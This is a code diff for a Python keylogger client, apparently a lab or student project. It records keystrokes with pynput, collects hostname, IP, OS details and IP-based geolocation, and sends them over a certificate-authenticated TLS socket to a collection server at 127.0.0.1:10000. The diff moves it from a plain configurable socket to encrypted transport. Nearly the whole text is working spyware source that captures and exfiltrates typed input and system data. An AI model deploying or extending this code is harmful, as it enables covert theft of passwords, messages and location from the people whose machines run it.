@@ -1,53 +1,145 @@
 from pynput.keyboard import Key, Listener
 import socket
+import ssl
 import threading
 import platform
 import time
 import requests
-from config import config
 
-# Global socket connection
-client_socket = None
-connection_lock = threading.Lock()
+# SSL Configuration
+SSL_SERVER_HOST = "127.0.0.1"
+SSL_SERVER_PORT = 10000
+CLIENT_CERT = "certs/client1_cert.pem"
+CLIENT_KEY = "certs/client1_key.pem"
+CA_CERT = "certs/ca_cert.pem"
+
+# Global secure socket connection
+secure_socket = None
+socket_lock = threading.Lock()
 
 
-# Function to establish and maintain connection
+def create_ssl_context():
+    """Create SSL context for client with certificate authentication"""
+    try:
+        # Create SSL context
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+
+        # Load client certificate and private key
+        context.load_cert_chain(
+            certfile=CLIENT_CERT,
+            keyfile=CLIENT_KEY
+        )
+
+        # Load CA certificate to verify server
+        context.load_verify_locations(cafile=CA_CERT)
+
+        # Require server certificate verification
+        context.check_hostname = False  # Set to True if using proper hostname
+        context.verify_mode = ssl.CERT_REQUIRED
+
+        # Set strong cipher suites
+        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
+
+        # Allow TLS 1.2 and 1.3
+        context.minimum_version = ssl.TLSVersion.TLSv1_2
+
+        print("[+] SSL context created successfully")
+        return context
+
+    except FileNotFoundError as e:
+        print(f"[!] Certificate file not found: {e}")
+        print("[!] Please ensure certificates are in 'certs/' directory")
+        return None
+    except Exception as e:
+        print(f"[!] Error creating SSL context: {e}")
+        return None
+
+
 def connect_to_server():
-    global client_socket
+    """Establish persistent SSL connection to server"""
+    global secure_socket
 
-    host = config.get('client', 'server_host')
-    port = config.get('client', 'server_port')
-    timeout = config.get('client', 'connection_timeout')
-    reconnect_delay = config.get('client', 'reconnect_delay')
+    try:
+        # Create SSL context
+        ssl_context = create_ssl_context()
+        if not ssl_context:
+            print("[!] Failed to create SSL context")
+            return False
 
-    while True:
-        try:
-            print(f"[*] Attempting to connect to {host}:{port}...")
-            client_socket = socket.create_connection((host, port), timeout=timeout)
-            print(f"[+] Connected to server at {host}:{port}")
-            return True
-        except Exception as e:
-            print(f"[!] Connection failed: {e}. Retrying in {reconnect_delay} seconds...")
-            time.sleep(reconnect_delay)
+        # Create raw socket
+        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        raw_socket.settimeout(10)  # 10 second timeout
+
+        # Wrap with SSL
+        secure_socket = ssl_context.wrap_socket(raw_socket, server_hostname=SSL_SERVER_HOST)
+
+        # Connect to server
+        secure_socket.connect((SSL_SERVER_HOST, SSL_SERVER_PORT))
+
+        # Get connection info
+        cipher = secure_socket.cipher()
+        version = secure_socket.version()
+
+        print(f"[+] Connected to server via SSL/TLS")
+        print(f"    - Cipher: {cipher}")
+        print(f"    - TLS Version: {version}")
+
+        return True
+
+    except ssl.SSLError as e:
+        print(f"[!] SSL Error: {e}")
+        print("[!] Certificate may be revoked or invalid")
+        secure_socket = None
+        return False
+    except ConnectionRefusedError:
+        print(f"[!] Connection refused. Is the server running on {SSL_SERVER_HOST}:{SSL_SERVER_PORT}?")
+        secure_socket = None
+        return False
+    except socket.timeout:
+        print(f"[!] Connection timeout. Server not responding.")
+        secure_socket = None
+        return False
+    except Exception as e:
+        print(f"[!] Error connecting to server: {e}")
+        secure_socket = None
+        return False
 
 
-# Function to send data through persistent connection
 def send_data_to_gui(data):
-    global client_socket
-    with connection_lock:
+    """Send data over persistent SSL connection"""
+    global secure_socket
+
+    with socket_lock:
         try:
-            if client_socket:
-                client_socket.sendall(data.encode())
-                # Only print for non-keystroke data to reduce spam
-                if any(keyword in data for keyword in ["COMPUTER_INFO", "GEO_LOCATION", "HEARTBEAT"]):
-                    print(f"[+] Sent: {data[:50]}...")
-            else:
-                print("[!] No active connection")
+            if secure_socket is None:
+                print("[!] Not connected to server, attempting to reconnect...")
+                if not connect_to_server():
+                    print("[!] Failed to reconnect, data not sent")
+                    return False
+
+            # Send data
+            secure_socket.sendall(data.encode())
+            print(f"[+] Sent (encrypted): {data[:50]}...")  # Show first 50 chars
+            return True
+
+        except (ConnectionResetError, BrokenPipeError, OSError) as e:
+            print(f"[!] Connection lost: {e}")
+            print("[!] Attempting to reconnect...")
+            secure_socket = None
+            if connect_to_server():
+                # Retry sending
+                try:
+                    secure_socket.sendall(data.encode())
+                    print(f"[+] Sent (encrypted): {data[:50]}...")
+                    return True
+                except Exception as e2:
+                    print(f"[!] Failed to send after reconnect: {e2}")
+                    return False
+            return False
+
         except Exception as e:
             print(f"[!] Error sending data: {e}")
-            # Try to reconnect
-            client_socket = None
-            connect_to_server()
+            return False
 
 
 # Format key into readable string
@@ -68,41 +160,55 @@ def format_key(key):
 def send_current_char(char):
     if char.strip():  # Only send if it's not empty
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-        send_data_to_gui(f"[{timestamp}] {char.strip()}")
+        send_data_to_gui(f"KEYLOG: [{timestamp}] {char.strip()}")
 
 
 # Function to send computer info and geo-location to GUI
 def send_initial_data():
+    print("\n[*] Gathering initial data...")
     computer_info = get_computer_info()
     geo_location = get_geo_location()
 
     # Send computer information
-    send_data_to_gui(f"COMPUTER_INFO: {computer_info}")
-    time.sleep(0.1)  # Small delay between messages
+    print("[*] Sending computer information...")
+    if not send_data_to_gui(f"COMPUTER_INFO: {computer_info}"):
+        print("[!] Failed to send computer information")
+        return False
+
+    # Small delay to ensure first message is processed
+    time.sleep(0.5)
 
     # Send geo-location information
-    send_data_to_gui(f"GEO_LOCATION: {geo_location}")
+    print("[*] Sending geo-location information...")
+    if not send_data_to_gui(f"GEO_LOCATION: {geo_location}"):
+        print("[!] Failed to send geo-location")
+        return False
+
+    return True
 
 
 # Function to retrieve computer information
 def get_computer_info():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    system = platform.system()
-    release = platform.release()
-    version = platform.version()
-    machine = platform.machine()
-    processor = platform.processor()
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
 
-    computer_info = (
-        f"Hostname: {hostname}\n"
-        f"IP Address: {ip_address}\n"
-        f"Operating System: {system} {release}\n"
-        f"OS Version: {version}\n"
-        f"Machine: {machine}\n"
-        f"Processor: {processor}\n"
-    )
-    return computer_info
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Error gathering computer info: {e}"
 
 
 # Function to retrieve geo-location information
@@ -112,12 +218,12 @@ def get_geo_location():
         if response.status_code == 200:
             data = response.json()
             location = (
-                f"IP Address: {data.get('ip')}\n"
-                f"City: {data.get('city')}\n"
-                f"Region: {data.get('region')}\n"
-                f"Country: {data.get('country')}\n"
-                f"Location (Lat, Long): {data.get('loc')}\n"
-                f"Organization: {data.get('org')}\n"
+                f"IP Address: {data.get('ip', 'N/A')}\n"
+                f"City: {data.get('city', 'N/A')}\n"
+                f"Region: {data.get('region', 'N/A')}\n"
+                f"Country: {data.get('country', 'N/A')}\n"
+                f"Location (Lat, Long): {data.get('loc', 'N/A')}\n"
+                f"Organization: {data.get('org', 'N/A')}\n"
             )
             return location
         else:
@@ -140,9 +246,8 @@ def on_release(key):
     global current_char
 
     formatted = format_key(key)
-    send_on_enter = config.get('keylogger', 'send_on_enter')
 
-    if formatted == "\n" and send_on_enter:
+    if formatted == "\n":
         # When Enter key is pressed, send the character and start a new line
         send_current_char(current_char)
         current_char = ""  # Clear the current character after sending
@@ -154,52 +259,52 @@ def on_release(key):
         # Otherwise, add the character to the current character string
         current_char += formatted
 
-    # Optional: Send every character immediately if send_on_enter is False
-    if not send_on_enter and formatted not in ["\n", "[BACKSPACE]"]:
-        send_current_char(formatted)
+    # Debugging: print current character (optional, comment out for less verbose output)
+    # print(f"Current Character: {current_char}")
 
     if key == Key.esc:
         return False  # Stop listener on ESC
 
 
-# Heartbeat to keep connection alive
-def heartbeat():
-    heartbeat_interval = config.get('client', 'heartbeat_interval')
-
-    while True:
-        time.sleep(heartbeat_interval)
-        send_data_to_gui("HEARTBEAT")
-
-
 # Start listener and send initial data
 def start_keylogger():
-    print("[*] Signal Keylogger starting...")
-    print(f"[*] Configuration loaded from: {config.config_file}")
+    print("=" * 60)
+    print("SSL/TLS Keylogger Client")
+    print("=" * 60)
+    print(f"Server: {SSL_SERVER_HOST}:{SSL_SERVER_PORT}")
+    print(f"Client Certificate: {CLIENT_CERT}")
+    print("=" * 60)
 
-    # Establish persistent connection
-    connect_to_server()
+    # Connect to server
+    print("\n[*] Connecting to server...")
+    if not connect_to_server():
+        print("[!] Cannot start - Failed to connect to server")
+        return
 
     # Send initial computer and geo-location info
-    print("[*] Sending initial data...")
-    send_initial_data()
+    if not send_initial_data():
+        print("[!] Failed to send initial data")
+        return
 
-    # Start heartbeat thread
-    print(f"[*] Starting heartbeat (interval: {config.get('client', 'heartbeat_interval')}s)")
-    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
-    heartbeat_thread.start()
-
-    # Start the listener
-    print("[*] Starting keyboard listener...")
+    print("\n[*] Starting keylogger...")
     print("[*] Press ESC to stop")
+    print("=" * 60 + "\n")
+
+    # Start the listener in a separate thread so the GUI can update without blocking
     listener_thread = threading.Thread(target=start_listener)
-    listener_thread.daemon = True
+    listener_thread.daemon = True  # Ensure the listener thread ends when the main program exits
     listener_thread.start()
 
     # Keep the main program running while the listener runs in the background
     try:
         listener_thread.join()
     except KeyboardInterrupt:
-        print("\n[*] Keylogger stopped by user")
+        print("\n[*] Shutting down...")
+    finally:
+        # Close connection
+        if secure_socket:
+            secure_socket.close()
+            print("[*] Connection closed")
 
 
 # Start listener
